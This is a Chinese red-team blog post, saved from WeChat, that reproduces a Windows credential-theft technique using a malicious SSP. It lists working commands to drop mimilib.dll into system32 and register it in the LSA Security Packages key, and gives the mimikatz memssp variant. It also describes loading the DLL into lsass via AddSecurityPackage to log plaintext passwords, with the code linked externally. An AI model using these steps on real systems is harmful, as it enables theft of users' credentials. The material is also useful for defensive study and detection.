> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YBAnFbgNd7Q0Eif3Q119qg)

  
 **在 C1Y2M3 师傅看到的思路，师傅没有给出完整代码，这里来复现一下。**

关于 SSP 的利用网上已经有很多的文章了，在 16 年左右三好学生师傅就已经对其有过详细的阐述，这里就不赘述了，或者可以来看 snowming 的文章 (http://blog.leanote.com/post/snowming/ebdd89a8e83c)。都是基于注册表项来进行操作：

```
copy mimilib.dll %systemroot%\system32

reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
```

文件位置：

```
C:\Windows\system32\kiwissp.log
```

或者纯内存操作：

```
privilege::debug

misc::memssp
```

文件位置：

```
C:\Windows\system32\mimilsa.log
```

而按照 C1Y2M3 师傅的思路就是

```
将动态库或是驱动文件打包进一个可执行文件中，再由需要使用的时候，再临时释放和加载。

通过调用 AddSecurityPackage API函数可以使 lsass.exe 进程加载指定的SSP / AP，无需重启
```

有了思路，我们就是来复现了。

**编译环境：VS2015**

首先新建一个控制台项目，然后，右键资源，新建资源

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9sLlRfPX6BNYjnzp1O7IXm3RpaLvy2qz3y4ibgsibgMPKlFV9ubnWCVHZlgsKzia95e0EDhiasLkZXw/640?wx_fmt=png)

选择自定义，然后随意命名之后，添加我们的资源。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9sLlRfPX6BNYjnzp1O7IXoIHzCicUA20B7ga2Lro3bBXl6SR1VmCoKFdZevjT7L6AdFs04IxXVjQ/640?wx_fmt=png)

此时可以在自动添加的 “resource.h” 头文件中看到我们的资源 ID 宏；

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9sLlRfPX6BNYjnzp1O7IXwXEPuWbwyfa8dIahrtia5RQic6bmdrHk8ucsDKdOrLca6KDPCkg4kiaRw/640?wx_fmt=png)

剩下的就是编写我们的代码了，代码的话我已经上传至了 GitHub：https://github.com/lengjibo/RedTeamTools/tree/master/windows/CredSSP

大家看一下就可以明白了。

然后管理员权限运行，就可以抓到明文密码了。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08V9sLlRfPX6BNYjnzp1O7IXAL11PeSnk2cM4kiauulA7x2J7pPhIyrUgb5Zlx2HjEmoemO9XyY3nfQ/640?wx_fmt=png)

当然也可以利用 c1y2m3 师傅所说的，与 HTTP.SYS 进行结合。这里就不演示了。

参考文章：

https://c1y2m3.github.io/c1y2m3.github.io/2020/06/15/SSP/

http://www.mamicode.com/info-detail-2638519.html  
https://www.4hou.com/posts/y6jW  
https://blog.csdn.net/ayang1986/article/details/83351842

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)